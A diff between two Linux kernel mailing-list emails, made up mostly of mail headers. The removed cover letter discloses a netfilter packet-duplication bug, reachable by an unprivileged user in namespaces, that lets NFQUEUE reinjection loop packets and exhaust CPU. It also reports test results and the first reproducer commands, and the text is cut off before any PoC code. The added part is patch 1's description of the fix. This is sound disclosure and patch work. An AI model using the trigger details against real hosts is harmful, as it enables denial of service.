@@ -4,152 +4,154 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8DFA9CC6B39
-	for <intel-wired-lan@archiver.kernel.org>; Thu, 15 Oct 2026 15:55:10 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 77F37CC6B3A
+	for <intel-wired-lan@archiver.kernel.org>; Thu, 15 Oct 2026 15:55:11 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 2FF31608E6;
+	by smtp3.osuosl.org (Postfix) with ESMTP id CAF3F608C9;
 	Thu, 15 Oct 2026 15:55:10 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id Ev-Lie4bn-ph; Thu, 15 Oct 2026 15:55:09 +0000 (UTC)
-ARC-Filter: OpenARC Filter v1.3.2 smtp3.osuosl.org DC40C60881
+ id D3urdF1W_IqN; Thu, 15 Oct 2026 15:55:10 +0000 (UTC)
+ARC-Filter: OpenARC Filter v1.3.2 smtp3.osuosl.org E487B608D6
 Authentication-Results: smtp3.osuosl.org; arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
-ARC-Seal: i=2; d=osuosl.org; s=arc; a=rsa-sha256; cv=pass; t=1792079709;
-	b=gOH5iRzzJjwe7TbRwwRCnBvp1D+rRyST9lFdJvhcYlUmUjdfdkKtF9Qd/e7wbC391EoB
-	 G8o43sh0YToXhJ4+tCyt43QagO9ignxb6MgxN0/tM8K+/8UrTyvbiHZK8hwXKn1P2+dVD
-	 3nsVcj36nhBLJdN+fBdcv0xJDZDaIUlH3JmeSaK2oAsmzjzwIxCylpIpa5HSLjx1HMpQ3
-	 LyTwfroABUWsiGAWAmLaK0cXEoVuIEgHaVmV8+KM16vH8X+FGGRO4i7eoKZ2TOnTRcAM8
-	 YMQy+NgE3m6RB7c0wF/KU0pDOqLFLBzbO79QBNs1Ys/FvcofULew+XC+/YWiXl4qLbw==
+ARC-Seal: i=2; d=osuosl.org; s=arc; a=rsa-sha256; cv=pass; t=1792079710;
+	b=sGQepq3gtPEgNvFmbMPUgXjumVRDbH/8bIhbEyTueWJh3wROevOWe6tdStBpqkpMKwxP
+	 q5OUMBGoUmAA+ACNNHe+ve1J5eYS9Jyuol8yScrWTKAfq6Nm30RbqwZk+Y65CCtMA8FxD
+	 txVouAkyV64J4Suatbf3lOfEskPSJ42FvbfyCVrd13SFPMAExzWbvxWQR+YFfgIvFNQ3P
+	 VsvbzwaJ8/hbtLkQWCFQvKL0f0v9Sc2LqhhcU2Lun+Ggi3NHFYkEoIXUJqrSGEVacipP1
+	 N2amXhiaWRQG+GypKXrfV8vlXxDqmvRo2VdMc94GHTJMLHehAhy9CP3iSrwdmsCLpzw==
 ARC-Message-Signature: i=2; d=osuosl.org; s=arc; a=rsa-sha256;
-	c=relaxed/relaxed; t=1792079709;
+	c=relaxed/relaxed; t=1792079710;
 	h=X-Comment:DKIM-Signature:X-Original-To:Delivered-To:Received:
 	 Received:X-Virus-Scanned:X-Spam-Flag:X-Spam-Score:X-Spam-Level:
 	 X-Spam-Status:Received:ARC-Filter:Received-SPF:Received:Received:
 	 DKIM-Signature:X-Google-DKIM-Signature:X-Forwarded-Encrypted:
 	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
-	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding:
-	 X-Mailman-Approved-At:X-BeenThere:X-Mailman-Version:Precedence:
-	 List-Id:List-Unsubscribe:List-Archive:List-Post:List-Help:
-	 List-Subscribe:Errors-To;
-	bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
-	b=hSKHcn1yaVeO8bVEXnPliMBDoM8qNNocftyECY6R8xclvsgfpacbA+ScdrikgvY3HsAJ
-	 bwfxWo1railRMokX6mj47x1spNhQqQen5mSz2Go+2dLvSMGLvg0QvkJHFF9Fs1e7bg8ep
-	 iSQHkHA3ahFogVQRzVI0hZ23tIamJVTRK+Yfq7uKYOlX9quSMI2EDObp9gfM5sDgef/xk
-	 PmQh2jPFhmv/XIj3zoqhkpYyqky3pXCzvUQ8LO4vymDHSNqNI04HByBVj8Bdr+VsCuss4
-	 bMPiztUNM79U1dExvDiUYNctM1jGc5yb5QuW0VEDSTpXDhcihwL6mPMNR78wi0KcKeA==
+	 Date:Message-ID:X-Mailer:In-Reply-To:References:MIME-Version:
+	 Content-Transfer-Encoding:X-Mailman-Approved-At:X-BeenThere:
+	 X-Mailman-Version:Precedence:List-Id:List-Unsubscribe:List-Archive:
+	 List-Post:List-Help:List-Subscribe:Errors-To;
+	bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+	b=G+Be/yJhvpfEGJuwORIIymgErd0GYzwitrK+SSaMAscTrLP3s/nuZ1QNxcxROw1zWb0j
+	 0u5Dd/nVmwkhtYDboKflXS3YG5x5xG+HmpZiM18AdXNiGgRRaFow2IlJXfxtfMfioZwos
+	 Ttvp0sInRkBBqdPKGOtZCYFL2HGT2COdQ3IxSFrlJz4gEUhmWpxmzhll+mH42d2cI7TfE
+	 qX3qr8srdUqKvOflc9zFFmd0L6IrMulbdO5SjsiAlS943tpnjOfgeLC10knQjOSZfayUg
+	 Vn+Fyq2qwMf83sC1EhrWxLnxyITPHU5Xz/We4/GvXsfnqwbGuRwV3AmYwPmQS4/4OtA==
 ARC-Authentication-Results: i=2; smtp3.osuosl.org; 
 	arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=intel-wired-lan-bounces@osuosl.org; receiver=<UNKNOWN> 
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=osuosl.org;
-	s=default; t=1792079708;
-	bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
-	h=From:To:Cc:Subject:Date:List-Id:List-Unsubscribe:List-Archive:
-	 List-Post:List-Help:List-Subscribe:From;
-	b=Gt6GgzvFvuldJ4vTLxB4F+gJ+bLIRWKWYVsptQCeqr8RPx7u3BUbKc8t/2mRfrnVM
-	 HUuktXy53hFg8WpvwHW27NiRVayzdWDSKJNQnv51oQgM9Rem0QHUuFnIgZ/OI17nl/
-	 HTcRBsbkPNFoH6N3vvxHO6yMa6jhjmra2JOEDzRPdQLvJrC1Sk92kUwVpqyeHtxnPZ
-	 k4h4kegOJSz5V+AkeOv1ypITPwT2rQCMP2FA7logkgyAo4sq1OOZVQKKfM59feXzbl
-	 6/iH+bmRfq1QNeoooisOtILoTRIkhdnKG24Qy5DokJKXktBHOcDhbEMGGC1jBFVuWT
-	 ROLJMqU2kJM0w==
+	s=default; t=1792079709;
+	bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+	h=From:To:Cc:Subject:Date:In-Reply-To:References:List-Id:
+	 List-Unsubscribe:List-Archive:List-Post:List-Help:List-Subscribe:
+	 From;
+	b=Ur6ggpNkRRfFO7SJUclD8RhGTDYc19DeF/6Z9rMGYW/5Cry8scz/S/5k7i2LsP6iz
+	 yMvZfgNgrhdhx2UrM99ORV6Lyl7kslPV/1pqitGJZz9myYjnzNdSEDtWVmx5kgz1zg
+	 oh1mjbVgBft6Skw1jRM8OVbZapGZONF7qo8rZR1Gn38rvJmnChIRn1okOu+vpbcQ32
+	 sjvho8Nzkk2oHsqbRbjxtm+ICjyxt/oTJBg7jMCtAAZxhIx3+hSZMls5Kc7J9+UhNE
+	 eiQ3Q/LRaAbcCwgrQn4K228QXrkVAeuDS11TM57cl8HEn2ArIA//TvpNK3v0wlaVqh
+	 vnPjZQ8PxmZPw==
 Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp3.osuosl.org (Postfix) with ESMTP id DC40C60881;
-	Thu, 15 Oct 2026 15:55:08 +0000 (UTC)
-Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by lists1.osuosl.org (Postfix) with ESMTP id B8A82769
- for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:03 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id E487B608D6;
+	Thu, 15 Oct 2026 15:55:09 +0000 (UTC)
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [IPv6:2605:bc80:3010::137])
+ by lists1.osuosl.org (Postfix) with ESMTP id 2C6A5769
+ for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:12 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id AA4DF80FC6
- for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:03 +0000 (UTC)
+ by smtp4.osuosl.org (Postfix) with ESMTP id 1241B407E7
+ for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:12 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp1.osuosl.org ([127.0.0.1])
- by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id PeX0Nj5u4KHx for <intel-wired-lan@lists.osuosl.org>;
- Thu, 15 Oct 2026 07:45:02 +0000 (UTC)
-ARC-Filter: OpenARC Filter v1.3.2 smtp1.osuosl.org 5571D80FB9
-Authentication-Results: smtp1.osuosl.org;
- arc=none smtp.remote-ip="2607:f8b0:4864:20::1030"
-ARC-Seal: i=1; d=osuosl.org; s=arc; a=rsa-sha256; cv=none; t=1792050302;
- b=irku8R8G+Nuq1UDo3txNXGz1B3qJKK+dDReInI2TM63COWT2Jynu0/DoGsWIjOUa4pDa
- /dba6tbbYPpn0phl8hvbH1kFdfhF+sYyhWSU816TA9r12S8rdcCLIQ60lx8YdoXW1QLWA
- /0ZdE8uz+qu4IUqNf321JX+MxTTtCDRptJa9qxgkj2RRm6XDu5VSbIdvBlJiYu7l3Nk/l
- FweuvuNbtWSxc7AxMQ/RPOPw+Acx5/4zx/+8mdW/pNve+4cx7RjpJvQ8BVUJzDFKTr2Yr
- cKSEkmi9bPG9yt/lYLl7ah9a9Yhoo2JIAcUFDiwvcb4Fwri9TesTJdm014moGVHBQkg==
+Received: from smtp4.osuosl.org ([127.0.0.1])
+ by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id OZcCZU_hksM2 for <intel-wired-lan@lists.osuosl.org>;
+ Thu, 15 Oct 2026 07:45:11 +0000 (UTC)
+ARC-Filter: OpenARC Filter v1.3.2 smtp4.osuosl.org 428D0407DA
+Authentication-Results: smtp4.osuosl.org;
+ arc=none smtp.remote-ip="2607:f8b0:4864:20::531"
+ARC-Seal: i=1; d=osuosl.org; s=arc; a=rsa-sha256; cv=none; t=1792050311;
+ b=kdImtnBPWCICSnMfs1Of5DnTsb/f85lmzn8AnBLIIJMm4n++1N9YP6H5x9d7f4Gmpfpv
+ 6elRpbkN7SHOUDpGKD8z7geyAQGZG/mIdZaZDYC81R7U2hBkDGkye/pXrpdTgwPqrjdMT
+ /sRFXrNTkmxonmcfQ3a2EghJ2HMPsHTQkuUJNbhWd2hVhcgAGQtIax5rCld1gmC5dTZZ1
+ yxRRvz4E1+ZTYmnO48iX15+XNhKpsEWkrlN8xxarnJB1dbX1s6TZf76lNnC3pcPP6xOoj
+ 8ccdILqaweXVa5BNIBZHb4Yrn2LQ9CbqjCBuHoLT22dI+0Qze5QAhsdHW/l2ow/4kDQ==
 ARC-Message-Signature: i=1; d=osuosl.org; s=arc; a=rsa-sha256;
- c=relaxed/relaxed; t=1792050302;
+ c=relaxed/relaxed; t=1792050311;
  h=Received-SPF:Received:DKIM-Signature:X-Google-DKIM-Signature:
  X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
- From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
- Content-Transfer-Encoding;
- bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
- b=Lxef0mdmzqYsO+hvta3avxB2TvCG0ZHuEI2d9jdxer1M2nVVuFvV4112P1h+49yxlUmh
- GW6INgWGfZX1oS5FZ7CWDIMHt0UyENZzoYt3uY4+U3IWXU+i1bhasFl2/eLFLzhUdZDQo
- RmQ21AqNp7RLSfSxfDY8F3mhYPk0kc6N2F2cDvGlBGaK1YMDRdT1TfeWnPG3gb7KqNiGr
- Bl/wyzqChWepZQ/yTcf5B/AiQnr00524BAYMPlxhBa6Jbhjy09013qwc7awD9rtGa4I82
- PqHek8SiDagiV+TiZ9U6HcK3PVQ7dSopDkFDG+i8sFy/BF5bKH0F0HZhyLcg8E2cE0g==
-ARC-Authentication-Results: i=1; smtp1.osuosl.org; 
+ From:To:Cc:Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:
+ MIME-Version:Content-Transfer-Encoding;
+ bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+ b=D+h3aKSyw9Q6y3MZXTSMwcpp4GdXnVYKBrQysyG8D/NPDLRRXYTVZMA99BjZxpME8n3U
+ DDYnOS1THAgW7ua6/8e3fU/o9xIEtunREpuYrCcHvLpI93E0Q00tu23ZQd0E84j6q5Rwt
+ UDNYNhEIcd1cFwDPMaYJN08NUNrYO+zrrC0D8us5E2t20thmUK+ZTuXOytUp2ku9PPj0f
+ wG416S+q89ZTFMKNTnW9B4LCtGOSP4MJVskpcLshIbQhEEsxSDv9IPwPwh/+xju/HNg7e
+ 0kdqf1HjUXnKpHXEBCzOSWbC+jM6X4aG3VLuIw56fs9/1qyL0Fku36K+9A4D876Dg6Q==
+ARC-Authentication-Results: i=1; smtp4.osuosl.org; 
  dmarc=pass header.from=nebusec.ai;
  dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
- header.s=google header.b=dfjUl4ul; 
- arc=none smtp.remote-ip="2607:f8b0:4864:20::1030"
+ header.s=google header.b=dQRwOo8J; 
+ arc=none smtp.remote-ip="2607:f8b0:4864:20::531"
 Received-SPF: Pass (mailfrom) identity=mailfrom;
- client-ip=2607:f8b0:4864:20::1030; helo=mail-pj1-x1030.google.com;
+ client-ip=2607:f8b0:4864:20::531; helo=mail-pg1-x531.google.com;
  envelope-from=zihanx@nebusec.ai; receiver=<UNKNOWN> 
-Authentication-Results: smtp1.osuosl.org; dmarc=pass (p=quarantine dis=none)
+Authentication-Results: smtp4.osuosl.org; dmarc=pass (p=quarantine dis=none)
  header.from=nebusec.ai
-Authentication-Results: smtp1.osuosl.org; dkim=pass (2048-bit key,
+Authentication-Results: smtp4.osuosl.org; dkim=pass (2048-bit key,
  unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
- header.s=google header.b=dfjUl4ul
-Received: from mail-pj1-x1030.google.com (mail-pj1-x1030.google.com
- [IPv6:2607:f8b0:4864:20::1030])
- by smtp1.osuosl.org (Postfix) with ESMTPS id 5571D80FB9
- for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:01 +0000 (UTC)
-Received: by mail-pj1-x1030.google.com with SMTP id
- 98e67ed59e1d1-3ac6794fe45so1153342a91.0
- for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 00:45:01 -0700 (PDT)
+ header.s=google header.b=dQRwOo8J
+Received: from mail-pg1-x531.google.com (mail-pg1-x531.google.com
+ [IPv6:2607:f8b0:4864:20::531])
+ by smtp4.osuosl.org (Postfix) with ESMTPS id 428D0407DA
+ for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:10 +0000 (UTC)
+Received: by mail-pg1-x531.google.com with SMTP id
+ 41be03b00d2f7-ccce6d9abfeso2830039a12.1
+ for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 00:45:10 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=nebusec.ai; s=google; t=1792050301; x=1792655101; darn=lists.osuosl.org;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
- bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
- b=dfjUl4ul/XekSyT1coqAUp8ru+GYGbQ7K9ensSwjIXHAft9rEYTQ2p4jv5xr+f/32G
- jenUko/ridvxr5riANvYlQJ4wcln/2XaSkRljgAusKclit135aXJsC2QZuHvr/urAwo6
- cfhcO85wI1n9c6NdOUEucNQfMjo+DRJyXAa3KEJqOowswPaTzL5nzqHo73exKexY1/Q0
- a7ZYZKkE/DTNY+PoC2BfjHrYKXLtWNtCAg5TWxTgNtVRHOPWmhQW06WQH/HO+SbyrFCu
- TiPMF0tX2wtIHoyYFtbY4TFwVA6uN/FhBZwcw2Kpy0NZ2Fp35QOArfULZSzI+7niaW7/
- gQBQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20260707; t=1792050301; x=1792655101;
- h=content-transfer-encoding:mime-version:message-id:date:subject:cc
- :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+ d=nebusec.ai; s=google; t=1792050310; x=1792655110; darn=lists.osuosl.org;
+ h=content-transfer-encoding:mime-version:references:in-reply-to
+ :message-id:date:subject:cc:to:from:from:to:cc:subject:date
  :message-id:reply-to:content-type;
- bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
- b=AIgjl0Imy4IT6oNkuDcWemqd9kk3T811AxLbHIdqeCZZbD6sSBtnd6WtgBMc9Bdgwl
- /yabCmZU8EgjaeLrmGW4xvdoXrj7eVfbVVC6Z3JtK8geWZ8FpAr4cKIUvProgZzAu5XY
- zTKT50F+AoJE/v6VIF6Dok9rZaR1v3orc3OfjUnM1zs9R8aRiimMiGQneigF+Tu8NAyl
- XJscPxp/oIaOCy2Mas5oOar6QMTB5sCnX2LFBLZ2+JOd0E8KTIrpSiFhebBB4Qr1Rk3l
- MfrN/iLW57jEXwA/73kpQ4ukJesocHBY6AOMzFf7/uuBLYqstvQ68ea0sScZSYRk7FG6
- GvLw==
+ bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+ b=dQRwOo8JKl6ZVHBDQXJV14gLhKnjmed6E69/l36qUIQoK6MP2LLH4i4H83OGw7NBP5
+ Xdok0FK9ATHXLL85MI1Fe9x0p1kEAyMN3nFothRc+H9E2LGHVphsxyDPf/prDBkLCcUN
+ x0hOkivVE0F9nXP5AX+HOVkTW6WInM2sPXIYozfQdINg+5RvmDBfWLqBVyRHKM4Ynu0v
+ 3r1tiw7FqkVN4Lyao4oL2VeAEN/soEer2EB95LzpI/MT4qMh7TFThTMpBjsqdrTuNH2m
+ pDw5iJfqFMCS8DBuoMdwDPypwgEBVQR7if8oViAjNok1WpzGWJ5Gso8zR8unlL+LVqsD
+ 1abA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=1e100.net; s=20260707; t=1792050310; x=1792655110;
+ h=content-transfer-encoding:mime-version:references:in-reply-to
+ :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+ :to:cc:subject:date:message-id:reply-to:content-type;
+ bh=s18ZSAeaTj3uFCQOPUAhE8p5i1eeNicCpcv0Dn1C87s=;
+ b=IsOz49BvyKtsJScrNCqLfyapwxS+diWPa3YsOYk/Qgu1d0QD74hLQ3Jwi5V/v13xvH
+ nAw/Oq7XvzXxcfopvC8gPKA4PlC8Di3N1QAQDD/qmEV/KPcqQfXLxin4+TWMz09Zk8j8
+ c+uzFvx89kguwkc2pdBhnL7UYmFzEqUt1NA7yB4/FZzhCwNdrYqnV0l3BQnIBDkbSKjC
+ rb2DxWn4Vn1c3G/jFUK5UWyFgXr/GnQZaHSCCOnKZD355wvGzx6KRhQBkR9oyrfCHPiu
+ cHvPkwIuauYltO46fI9ZoS43d+P6rzjkXtMlCTYLhKWaM2zwCSZmGYyD/D1/OJM79Yp3
+ YFwQ==
 X-Forwarded-Encrypted: i=1;
- AKwUvBzNFNJfBE0QfZO7hG6igG4256GIApeFHsI6CUNkI6Taun1Jz0JNwI+fxCGsUg32YQZ6+Pq3u2nZgsKp9SFmSLo=@lists.osuosl.org
-X-Gm-Message-State: AFq9FYKBPlIGzMCw4n9ukjsEWhEogEbe9tpXbc9lvtjE4ALdETHyQ4+D
- nDV1FAPqfCVbcsSZCeeXlCPFz76F/Ph7ckUlU4IMcsICraf7ev+Nx1NWkpqIBoZlTF4B
-X-Gm-Gg: AYBFou1vL+iSNY98aEod8dhhZFMdzxSCaDGn76QcVlQnYIKoTqr8p6GcYC9ut8b46Df
- pTNZUf5i7g9CKKMuLAXBEhZyXaOeDg+w7QgLrA5mcZ6TjHpkwBnPcUP/vl7WyMUUeNkfmXn1WGU
- E5C11iRJ6kI9MO+QYXwjcpoVoH60B2qkDs+SWXc3rmawEh79lJ7IImWdkptKGFkiCayJ2juJEv6
- zl2oNm9AD64LS5WYphNsql0ljz0GxnbujkQASV/Jtj3Viq9YGatqarHo6OHMgG/6Um7LszxmOJR
- yRox3tnAJ1wtJla60pSX+BSSWVWdxe3WEUAKG4T0jitqU/0QBB3RPF6mXhbEL3/n+cXKPdd097N
- roDSVtp/w0ffx8DfkVXwNWCwIJV+mt5jbR38UlFyAfJciRa8QnyinFzxZl4mxsWI9IlrwCc+Mrv
- JcjH0r+CSm4iQevWg+kgfG8VCkX1WKwc0N+N68a5lBabpolkGFWNVqSPtEnLnL0jux1vMp/WblA
- dazLcgWqGQQp85kp9EA3oZZYI/PLg==
-X-Received: by 2002:a17:90b:4d0b:b0:3ab:1285:dfd6 with SMTP id
- 98e67ed59e1d1-3ac6f2952e2mr4157445a91.38.1792050300873; 
- Thu, 15 Oct 2026 00:45:00 -0700 (PDT)
+ AKwUvBzBmnhKxz/U9sXN881nXR91Orip44sFSFha+5IReKAyo2jDfHHvFv+O7U0ELCJMJraj0wnvhTB/ysSQpZs602I=@lists.osuosl.org
+X-Gm-Message-State: AFq9FYJo4Sdb1I7DGKdFZd5oERrqnBXiDdyNohhox8hk/bWVvicKW2ia
+ soNiNS8b5Il5Lel+w/9RzEVaUpEaotR8xOGrNEeNWrqQ3AYCnqUA476BBQjRLfij1Qdd
+X-Gm-Gg: AYBFou2uDaMjaAUFeGM0Iyu6iZWwO1FeTITgqhRcijLcNv30SGs1J1RK/B7RllFTPm1
+ Dt7NYps9FYtVHMcgwso6yuLn2P70eCOs0ZyxIDMu9kguwK4o4C3mD4s7OS+vG0eJnpomV8il0H5
+ 3e2btUAYpZatwggggWig5r8slqXU/iYDfRc+lfxoXUCAWsy2b3f3FMJsHcg8vb1YsBo7QFGjmTE
+ B8im488SsiybMQBXd5wP9wUmvK1emGGwdys0u09k4FGhucsg55a2fQf9oCG5Zn9aD1++XjU3iDA
+ W4l0g3p2JCRY1HDMgq5Cc/t9tCb9JNyrG/z6B84eAWotYfI4vM1XRTzzVcQ88wBRINGrFIa1ltZ
+ 3npbEtXRtCAXZhqIObX559jb11GOZYmv/47T9jXnzUf7fYta/WN/LmkLhHYQL6k0cdYWG4YO2YH
+ 03A05ZIfulPpQQpJSPsa/62bZ3fQqtrdEgx0Cqg0tFtybTdPX8M/GOP0jr8VLl7weK7IU4k0s8u
+ k/4SIkdF1veYl8asguBUkBK7cpMMA==
+X-Received: by 2002:a17:90b:4d85:b0:3a4:c946:9f4e with SMTP id
+ 98e67ed59e1d1-3ab3acdc386mr14478029a91.58.1792050309820; 
+ Thu, 15 Oct 2026 00:45:09 -0700 (PDT)
 Received: from 24c857d0c3be.. ([122.51.212.64])
  by smtp.gmail.com with ESMTPSA id
- 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.44.50
+ 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.45.01
  (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Thu, 15 Oct 2026 00:44:59 -0700 (PDT)
+ Thu, 15 Oct 2026 00:45:08 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: netfilter-devel@vger.kernel.org, virtualization@lists.linux.dev,
  intel-wired-lan@lists.osuosl.org, bpf@vger.kernel.org
@@ -163,10 +165,13 @@ Cc: pablo@netfilter.org, fw@strlen.de, phil@nwl.cc, davem@davemloft.net,
  willemb@google.com, alice.kernel@fastmail.im, eilaimemedsnaimel@gmail.com,
  imv4bel@gmail.com, shiming.cheng@mediatek.com, sd@queasysnail.net,
  vega@nebusec.ai, root@tr0jan.top, zihanx@nebusec.ai
-Subject: [PATCH nf v8 0/3] netfilter: bound asynchronous packet duplication
-Date: Thu, 15 Oct 2026 07:43:06 +0000
-Message-ID: <cover.1792048855.git.zihanx@nebusec.ai>
+Subject: [PATCH nf v8 1/3] netfilter: nf_dup: preserve guard across NFQUEUE
+ reinjection
+Date: Thu, 15 Oct 2026 07:43:07 +0000
+Message-ID: <1eca65f844ea4eaefa9ea4a852f1db27aacc10b9.1792048855.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1792048855.git.zihanx@nebusec.ai>
+References: <cover.1792048855.git.zihanx@nebusec.ai>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 X-Mailman-Approved-At: Thu, 15 Oct 2026 15:55:07 +0000
@@ -184,236 +189,109 @@ List-Subscribe: <https://lists.osuosl.org/mailman/listinfo/intel-wired-lan>,
  <mailto:intel-wired-lan-request@osuosl.org?subject=subscribe>
 Errors-To: intel-wired-lan-bounces@osuosl.org
 
-Hi Linux kernel maintainers,
+NFQUEUE can suspend traversal of a duplicated packet while the task-local
+duplication guard is set. The output call then returns and clears the guard
+before a later verdict resumes hook traversal.
 
-We found and validated an issue in netfilter packet duplication. The bug
-is reachable by an unprivileged user in user and network namespaces.
-Bounded tests exercised the fixes. Non-duplication packet semantics are
-intended to remain unchanged. MIRRED flow offload for affected netdev dup
-rules is rejected because it cannot enforce the duplication-depth limit.
+Save the guard in the queue entry and restore it while reinjection continues
+hook traversal. Preserve and restore the verdict task's prior state, including
+nested synchronous reinjection.
 
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-The IPv4 and IPv6 duplication helpers use a task-local guard while a cloned
-packet traverses output hooks. If NFQUEUE suspends that traversal, the
-output call can return and clear the guard before a later verdict resumes
-the remaining hooks. The resumed packet can reach another duplication
-consumer without the original guard. This can cause repeated packet
-processing and consume CPU and network resources. Patch 1 records the
-guard in the queue entry and restores it during reinjection. It keeps
-bottom halves disabled during the reinjection traversal, restoring the
-verdict task state before reenabling them.
-
-The netdev nft dup path has a separate synchronous transmit recursion
-counter. It does not accompany a duplicated skb through asynchronous
-software receive paths. Patch 2 carries a bounded duplication depth through
-skb and supported XDP conversions, resets it on reused buffers, and rejects
-MIRRED flow offload where the software depth cannot be enforced. This scope
-covers software skb/XDP continuity, not packet loops through physical
-hardware or userspace device round trips.
-
-At PRE_ROUTING and LOCAL_IN, the IPv4 and IPv6 helpers decrement TTL or
-hop limit on the copy. Patch 3 stops creating copies when the value is
-<= 1, so the decrement cannot reach zero or wrap a zero value to the
-maximum. The three patches address the NFQUEUE reinjection, software
-netdev receive, and ingress TTL/hop-limit paths, respectively. The patch
-does not intend to change packet semantics for unrelated traffic; it also
-rejects affected MIRRED flow offload because it cannot enforce the
-netdev duplication-depth limit.
-
-Validation:
-
-The v8 series was built on nf.git main at
-ab699d296e066eb64f51d2a8a1d42237a3b186c8 and booted in a 2-vCPU,
-2-GiB QEMU guest as 7.3.0-rc5-g9a13bdbfd108. In bounded user/network
-namespace runs, the IPv4 and IPv6 nft dup/NFQUEUE tests each completed
-three callbacks with three successful verdicts and no verdict failures.
-A separate IPv4 run sent three UDP datagrams and completed nine callbacks
-with nine successful verdicts; the nft counters showed nine visits at
-each configured dup rule. These are bounded validation runs.
-
-For netdev dup, a native veth/XDP_TX-to-XDP_PASS test reached the
-first four depth-coded rules once each and did not reach the next two.
-The XDP_PASS control test without the transmit loop reached its single
-dup rule four times. The IPv4 TTL test observed eight matching packets
-and no TTL-0 or TTL-255 packets. The filtered IPv6 test observed eight
-matching packets and no hop-limit-0 packets; its one hop-limit-255 count
-was unrelated NDP traffic and is not evidence for the dup path. An IPv6
-xt_TEE/NFQUEUE test ran in a non-initial user/network namespace: one UDP
-datagram produced two callbacks, both accepted successfully. The guest
-test setup used ip6tables-legacy and pre-created its xtables lock file
-with mode 0666 so the unprivileged test process could open the lock.
-
-An unpatched-baseline bounded run by an unprivileged user in user and
-network namespaces reached 1,018,782 NFQUEUE callbacks in 61.643
-seconds. The callback counter is incremented before nfq_set_verdict(),
-so this is a callback count, not a successful-verdict count. This
-observed repeated packet processing and resource consumption.
-
-Reproducer:
-
-    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
-    unshare -Urn /bin/bash
-
-The NFQUEUE trigger requires a userspace verdict process, while the netdev
-test installs XDP programs and exercises veth skb/XDP conversion. Those
-setup and verdict interactions are not expressible as a standalone
-packetdrill exchange. The reproducer below covers the NFQUEUE path; the
